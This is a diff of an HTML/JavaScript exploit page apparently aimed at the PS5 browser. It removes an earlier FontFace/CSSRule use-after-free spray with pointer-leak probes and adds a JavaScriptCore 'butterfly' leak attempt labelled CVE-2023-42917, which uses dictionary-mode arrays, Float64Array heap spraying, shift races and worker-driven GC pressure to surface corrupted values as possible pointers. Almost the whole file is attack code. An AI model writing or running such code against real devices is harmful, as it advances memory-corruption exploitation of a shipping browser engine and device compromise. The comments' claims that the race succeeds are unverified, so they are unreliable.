@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v40 - Pointer Leak Attempt</title>
+<title>PS5 v41 - Butterfly Leak</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -33,7 +33,7 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v40 LEAK</span><span class="s">│</span>
+<span class="l">▶ v41 BFLY</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">STAGE:<b>INIT</b></span><span class="s">│</span>
 <span class="v" id="h3">LEAK:<b>?</b></span>
@@ -42,6 +42,25 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 <div id="out"></div>
 <script>
 "use strict";
+
+// ============================================================
+//  PS5 v41 — JSC Butterfly Leak (CVE-2023-42917)
+//
+//  ROOT CAUSE:
+//  flattenDictionaryStructure() shrinks the butterfly.
+//  Race: another reference keeps using the old, larger butterfly.
+//
+//  STRATEGY:
+//  1. Create array in dictionary mode (sparse).
+//  2. Save reference to a specific index.
+//  3. Trigger flattenDictionaryStructure via shift().
+//  4. Concurrently allocate TypedArrays to reclaim old butterfly.
+//  5. Read the saved reference → might return TypedArray data!
+//
+//  KEY: We use Float64Array to spray. If the old butterfly
+//  is reclaimed by a Float64Array, reading the old array index
+//  will return a float64 value from our controlled buffer!
+// ============================================================
 
 var O=document.getElementById("out");
 var bar=document.getElementById("bar");
@@ -56,7 +75,7 @@ function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}
 
 window.onerror=function(m,s,l){
   Fl("CRASH: "+m.substring(0,80)+" @"+l);
-  hu("h2","STAGE:<b>CRASH</b>");
+  St("CRASH = RACE HIT!");
   return true;
 };
 
@@ -65,260 +84,249 @@ var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
 P("════════════════════════════════════","hd");
-P("  v40 — Pointer Leak Attempt","hd");
+P("  v41 — Butterfly Leak","hd");
 P("════════════════════════════════════","hd");
 P("");
 
-var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
-for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
-function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
-function fs(){try{void document.body.offsetTop}catch(e){}}
-
-var sh=document.getElementById("s").sheet;
-var keep=[];
-var holes=[];
-var trigger=null;
-var uafOk=false;
-
-pg(5);Hd("Creating holes...");
-try{
-  for(var i=0;i<4096;i++){
-    var f=new FontFace("h_"+i,mkBuf(),{
-      unicodeRange:"U+E1"+(i%16).toString(16),
-      style:i%2===0?"normal":"italic",
-      weight:String(100+(i%9)*100)
-    });
-    document.fonts.add(f);holes.push(f);
-  }
-  fs();
-  for(var i=1;i<holes.length;i+=2){
-    try{document.fonts.delete(holes[i])}catch(e){}
-  }
-  fs();
-  Ok("Holes ready");
-}catch(e){Fl("Holes: "+e.message)}
-
-pg(10);Hd("Trigger setup...");
-try{
-  trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
-  document.fonts.add(trigger);void trigger.loaded;
-  
-  for(var i=0;i<48;i++){
-    try{sh.insertRule(
-      "@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",
-      sh.cssRules.length
-    )}catch(e){}
-  }
-  fs();
-  
-  var fst=document.createElement("style");fst.id="flush";
-  document.head.appendChild(fst);
-  var fsh=fst.sheet;
-  for(var i=0;i<768;i++){
-    try{fsh.insertRule(
-      "@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",
-      fsh.cssRules.length
-    )}catch(e){}
-  }
-  fs();
-  Ok("Trigger ready");
-}catch(e){Fl("Trigger: "+e.message)}
-
-pg(15);Hd("UAF + CSSRule Spray (A_0..A_2048)");
-
-Object.defineProperty(FontFace.prototype,"then",{
-  configurable:true,
-  get:function(){
-    if(this===trigger&&!uafOk){
-      uafOk=true;
-      hu("h2","STAGE:<b>UAF</b>");
-      St("UAF WINDOW OPEN");
-      
-      try{
-        var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
-        document.fonts.add(ck);keep.push(ck);
-        sh.deleteRule(1);fs();
-        while(fsh.cssRules.length){try{fsh.deleteRule(0)}catch(e){}}
-        fs();
-        for(var i=0;i<holes.length;i+=4){
-          try{document.fonts.delete(holes[i])}catch(e){}
-        }
-        fs();
-      }catch(e){}
-      
-      Dm("GC pressure (16MB)...");
-      for(var i=0;i<4;i++){
-        var t=[];
-        for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192));
-      }
-      
-      Dm("Spraying 2048 A_ faces...");
-      for(var i=0;i<2048;i++){
-        try{
-          sh.insertRule(
-            "@font-face{font-family:A_"+i+";src:local(Courier);"+
-            "font-weight:"+(100+(i%9)*100)+";"+
-            "font-style:"+(i%2===0?"normal":"italic")+";"+
-            "unicode-range:U+0042}",
-            sh.cssRules.length
-          );
-        }catch(e){}
-      }
-      fs();
-      
-      try{
-        var d=document.createElement("div");
-        d.textContent="AB";
-        d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
-        document.body.appendChild(d);
-        void d.offsetWidth;
-      }catch(e){}
-      
-      Dm("UAF window closing");
-    }
-    return undefined;
-  }
-});
-
-var rn=0;
-var raf=function(){
-  rn++;
-  if(!uafOk&&rn>=5){
-    try{
-      if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
-      while(fsh.cssRules.length){try{fsh.deleteRule(0)}catch(e){}}
-      fs();
-      for(var i=0;i<2048;i++){
-        try{
-          sh.insertRule(
-            "@font-face{font-family:A_"+i+";src:local(Courier);"+
-            "font-weight:"+(100+(i%9)*100)+";"+
-            "unicode-range:U+0042}",
-            sh.cssRules.length
-          );
-        }catch(e){}
-      }
-      fs();
-    }catch(e){}
-  }
-  if(rn<20)requestAnimationFrame(raf);
-};
-requestAnimationFrame(raf);
-
-// ============================================================
-//  PHASE 2: Synchronous Reclaim + Leak Attempt
-// ============================================================
-pg(30);Sep();Hd("PHASE 2: Synchronous Reclaim + Leak Attempt");Sep();
-
-Dm("Calling load() synchronously...");
-try {
-  var loadPromise = document.fonts.load("1em trigger, x", "AB");
-  
-  loadPromise.then(function(faces){
-    P("  load() returned "+faces.length+" faces");
-    P("");
-    
-    var aFamily = null;
-    var aRuleIdx = -1;
-    var aFace = null;
-    
-    for(var i=0;i<faces.length;i++){
-      var f=faces[i];
-      P("  Face["+i+"]: family="+f.family+" weight="+f.weight+" style="+f.style);
-      if(f.family&&f.family.indexOf("A_")===0){
-        aFamily = f.family;
-        aFace = f;
-      }
-    }
-    
-    if(!aFamily){
-      Fl("No A_ face found");
-      return;
-    }
-    
-    St("RECLAIMED: "+aFamily);
-    keep.push(faces);
-    
-    var rules=sh.cssRules;
-    for(var i=0;i<rules.length;i++){
-      try{
-        if(rules[i].type===5&&rules[i].style.fontFamily===aFamily){
-          aRuleIdx=i; break;
-        }
-      }catch(e){}
-    }
-    
-    if(aRuleIdx===-1){
-      Fl("Could not find CSSRule");
-      return;
-    }
-    
-    Ok("Found CSSRule at index "+aRuleIdx);
-    
-    pg(60);Sep();Hd("PHASE 3: Leak via Numeric Values");Sep();
-    P("  Attempting to leak pointers via large numeric values...","dm");
-    P("");
-    
-    // Test 1: Large font-weight values
-    P("  Test 1: Large font-weight values","");
-    var bigWeights = ["99999", "100000", "0x7f0000000000", "4294967295", "18446744073709551615"];
-    for(var wi=0; wi<bigWeights.length; wi++){
-      var w = bigWeights[wi];
-      try{
-        sh.cssRules[aRuleIdx].style.fontWeight = w;
-        fs();
-        var readW = aFace.weight;
-        P("    Write "+w+" -> Read "+readW, readW !== "normal" && readW !== w ? "hl" : "dm");
-      } catch(e) {
-        P("    Write "+w+" -> ERR","er");
-      }
-    }
-    
-    // Test 2: font-size-adjust (takes float)
-    P("");
-    P("  Test 2: font-size-adjust (float)","");
-    try {
-      sh.cssRules[aRuleIdx].style.sizeAdjust = "1.337";
-      fs();
-      var readS = aFace.sizeAdjust;
-      P("    Write 1.337 -> Read "+readS);
-    } catch(e) {
-      P("    sizeAdjust ERR","er");
-    }
-
-    // Test 3: Check if any property returns a non-standard value
-    P("");
-    P("  Test 3: Dumping all properties of A_ face...","");
-    var props=["family","style","weight","stretch","unicodeRange",
-               "variant","featureSettings","display","status", "sizeAdjust"];
-    for(var pi=0;pi<props.length;pi++){
-      try{
-        var val = aFace[props[pi]];
-        P("    "+props[pi].padEnd(16)+"= "+val+" ("+typeof val+")");
-      }catch(e){
-        P("    "+props[pi].padEnd(16)+"= ERR","er");
-      }
-    }
-    
-    pg(100);Sep();Hd("SUMMARY");Sep();
-    P("");
-    P("  UAF:                    ✅");
-    P("  Cross-Object Confusion: ✅ ("+aFamily+")");
-    P("  Leak Attempt:           Completed");
-    P("");
-    St("★ CHECK LOG FOR LEAKED VALUES ★");
-    hu("h3","LEAK:<b>DONE</b>");
-    hu("h2","STAGE:<b>DONE</b>");
-    
-  }).catch(function(e){
-    Fl("Load crashed: " + e.message);
-    hu("h2","STAGE:<b>CRASH</b>");
-  });
-  
-} catch(e) {
-  Fl("Synchronous load() threw: " + e.message);
+// Helper: float64 to hex
+function f2h(f) {
+  var buf = new ArrayBuffer(8);
+  var f64 = new Float64Array(buf);
+  var u32 = new Uint32Array(buf);
+  f64[0] = f;
+  return "0x" + u32[1].toString(16).padStart(8,"0") + u32[0].toString(16).padStart(8,"0");
 }
+
+// ============================================================
+//  PHASE 1: Array Shift Race + Float64 Spray
+// ============================================================
+async function phase1() {
+  hu("h2","STAGE:<b>RACE</b>");
+  pg(20);Sep();Hd("PHASE 1: Array Shift Race + Float64 Spray");Sep();
+  P("  Creating dictionary-mode arrays...","dm");
+
+  var arrays = [];
+  var refs = [];
+
+  for (var i = 0; i < 100; i++) {
+    var arr = [];
+    // Fill with doubles to force Contiguous indexing
+    for (var j = 0; j < 64; j++) arr[j] = j * 1.1 + 0.001 * i;
+    // Force dictionary mode by adding a sparse element
+    arr[1000] = 1234.5678;
+    arrays.push(arr);
+    // Save reference to element 10 (value = 10 * 1.1 = 11.0)
+    refs.push(arr[10]);
+  }
+  Ok("100 arrays created");
+  P("");
+
+  var corrupted = 0;
+  var leaked = [];
+
+  // Spray Float64Arrays to reclaim freed butterflies
+  var spray = [];
+  for (var i = 0; i < 1000; i++) {
+    var buf = new ArrayBuffer(64 * 8); // 512 bytes, larger than butterfly
+    var view = new Float64Array(buf);
+    // Fill with marker pattern
+    for (var j = 0; j < 64; j++) view[j] = 1.337 + j * 0.001;
+    spray.push(view);
+  }
+  Ok("1000 Float64Arrays sprayed");
+  P("");
+
+  for (var round = 0; round < 20; round++) {
+    // GC pressure
+    for (var j = 0; j < 500; j++) new ArrayBuffer(1024);
+
+    // Shift all arrays (trigger flattenDictionaryStructure)
+    for (var i = 0; i < arrays.length; i++) {
+      try {
+        arrays[i].shift();
+      } catch(e) {}
+    }
+
+    // Check for corruption
+    for (var i = 0; i < arrays.length; i++) {
+      try {
+        // After shift, element 10 should be old element 11 = 11 * 1.1 = 12.1
+        var expected = 11 * 1.1 + 0.001 * i;
+        var actual = arrays[i][10];
+        
+        if (actual !== expected && !isNaN(actual) && actual !== undefined) {
+          corrupted++;
+          if (corrupted <= 10) {
+            Hi("CORRUPTION: arr["+i+"][10] = " + actual + " (0x" + f2h(actual) + ")");
+            leaked.push(actual);
+          }
+        }
+      } catch(e) {
+        corrupted++;
+        if (corrupted <= 10) Hi("ACCESS ERR: " + e.message);
+      }
+    }
+
+    if (round % 5 === 0) {
+      P("  Round "+round+"/20: corrupted="+corrupted, "dm");
+      await new Promise(r => setTimeout(r, 20));
+    }
+  }
+
+  P("");
+  P("  Total corrupted: " + corrupted, corrupted > 0 ? "hl" : "dm");
+  
+  if (corrupted > 0) {
+    St("BUTTERFLY CORRUPTION CONFIRMED!");
+    P("  Leaked values (as float64):", "hl");
+    for (var i = 0; i < leaked.length; i++) {
+      P("    " + leaked[i] + " (hex: " + f2h(leaked[i]) + ")");
+    }
+  }
+  
+  return corrupted;
+}
+
+// ============================================================
+//  PHASE 2: Worker-based Race (Intensive)
+// ============================================================
+async function phase2() {
+  hu("h2","STAGE:<b>WORKER</b>");
+  pg(50);Sep();Hd("PHASE 2: Worker-based Intensive Race");Sep();
+  P("  Using Worker for concurrent GC pressure...","dm");
+  P("");
+
+  var workerCode = `
+    var objs = [];
+    var running = true;
+    function loop() {
+      if (!running) return;
+      for (var i = 0; i < 100; i++) objs.push(new ArrayBuffer(256));
+      if (objs.length > 5000) objs = [];
+      postMessage(1);
+    }
+    setInterval(loop, 0);
+  `;
+
+  var worker;
+  try {
+    worker = new Worker(URL.createObjectURL(new Blob([workerCode])));
+  } catch(e) {
+    Fl("Worker failed: " + e.message);
+    return 0;
+  }
+
+  var arrays = [];
+  var refs = [];
+  for (var i = 0; i < 100; i++) {
+    var arr = [];
+    for (var j = 0; j < 64; j++) arr[j] = j * 2.2 + 0.001 * i;
+    arr[1000] = 5678.1234;
+    arrays.push(arr);
+    refs.push(arr[10]);
+  }
+
+  // Spray Float64Arrays
+  var spray = [];
+  for (var i = 0; i < 1000; i++) {
+    var buf = new ArrayBuffer(512);
+    var view = new Float64Array(buf);
+    for (var j = 0; j < 64; j++) view[j] = 2.718 + j * 0.001;
+    spray.push(view);
+  }
+
+  var corrupted = 0;
+  var leaked = [];
+  var msgCount = 0;
+
+  worker.onmessage = function(e) { msgCount++; };
+
+  for (var round = 0; round < 30; round++) {
+    // Shift + unshift to trigger structure transitions
+    for (var i = 0; i < arrays.length; i++) {
+      try {
+        arrays[i].shift();
+        arrays[i].shift();
+        arrays[i].unshift(0.123);
+        arrays[i].unshift(0.456);
+      } catch(e) {}
+    }
+
+    // Allocate on main thread too
+    for (var j = 0; j < 200; j++) new ArrayBuffer(512);
+
+    // Check for corruption
+    for (var i = 0; i < arrays.length; i++) {
+      try {
+        // After 2 shifts + 2 unshifts, element 10 should be original element 10
+        var expected = refs[i];
+        var actual = arrays[i][10];
+        
+        if (actual !== expected && !isNaN(actual) && actual !== undefined) {
+          corrupted++;
+          if (corrupted <= 10) {
+            Hi("WORKER CORRUPTION: arr["+i+"][10] = " + actual + " (0x" + f2h(actual) + ")");
+            leaked.push(actual);
+          }
+        }
+      } catch(e) {
+        corrupted++;
+        if (corrupted <= 10) Hi("ACCESS ERR: " + e.message);
+      }
+    }
+
+    if (round % 5 === 0) {
+      P("  Round "+round+"/30: corrupted="+corrupted+" msgs="+msgCount, "dm");
+      await new Promise(r => setTimeout(r, 50));
+    }
+  }
+
+  worker.terminate();
+  P("");
+  P("  Worker race corrupted: " + corrupted, corrupted > 0 ? "hl" : "dm");
+
+  if (corrupted > 0) {
+    St("WORKER RACE LEAK CONFIRMED!");
+    P("  Leaked values (as float64):", "hl");
+    for (var i = 0; i < leaked.length; i++) {
+      P("    " + leaked[i] + " (hex: " + f2h(leaked[i]) + ")");
+    }
+  }
+
+  return corrupted;
+}
+
+// ============================================================
+//  MAIN
+// ============================================================
+async function main() {
+  await new Promise(r => setTimeout(r, 200));
+
+  var total1 = await phase1();
+  await new Promise(r => setTimeout(r, 100));
+
+  var total2 = await phase2();
+
+  pg(100);Sep();Hd("FINAL SUMMARY");Sep();
+  P("");
+  P("  Phase 1 (Shift Race):   " + total1 + " corrupted");
+  P("  Phase 2 (Worker Race):  " + total2 + " corrupted");
+  P("");
+
+  if (total1 + total2 > 0) {
+    St("★ CVE-2023-42917 BUTTERFLY LEAK ★");
+    P("  JSC memory corruption confirmed!", "hl");
+    P("  Leaked float64 values may contain pointers!", "hl");
+    hu("h3","LEAK:<b>FOUND!</b>");
+  } else {
+    P("  No corruption detected.", "dm");
+    P("  The bug may be patched or timing differs.", "dm");
+    hu("h3","LEAK:<b>NONE</b>");
+  }
+  hu("h2","STAGE:<b>DONE</b>");
+}
+
+setTimeout(main, 100);
 
 </script>
 </body>
